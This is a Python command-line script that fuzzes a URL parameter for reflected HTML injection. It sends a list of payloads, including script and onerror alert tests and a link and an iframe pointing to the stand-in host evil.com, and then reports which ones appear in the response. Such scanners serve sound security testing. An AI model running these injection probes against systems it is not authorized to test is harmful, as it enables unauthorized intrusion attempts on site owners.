#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
import sys

def fuzz_html_injection(target_url, param):
    payloads = [
        "<h1>Test</h1>",
        "<b>Bold</b>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<a href='http://evil.com'>Click</a>",
        "<div style='color:red'>Styled</div>",
        "<marquee>Moving</marquee>",
        "<iframe src='http://evil.com'></iframe>",
    ]

    print(f"[*] Starting HTML injection fuzzing on {target_url} for parameter '{param}'")

    for payload in payloads:
        encoded = urllib.parse.quote(payload)
        url = f"{target_url}?{param}={encoded}"

        try:
            response = requests.get(url, timeout=5)
            if payload.lower() in response.text.lower():
                print(f"[+] Possible injection: {payload}")
            elif "<h1>" in response.text or "<b>" in response.text:
                print(f"[?] Partial reflection: {payload}")
            else:
                print(f"[-] No reflection found for: {payload}")
        except Exception as e:
            print(f"[-] Error testing {payload}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTML Injection Fuzzing Script")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://target.com/search)")
    parser.add_argument("-p", "--param", required=True, help="Target parameter (e.g., q)")

    args = parser.parse_args()
    fuzz_html_injection(args.url, args.param)
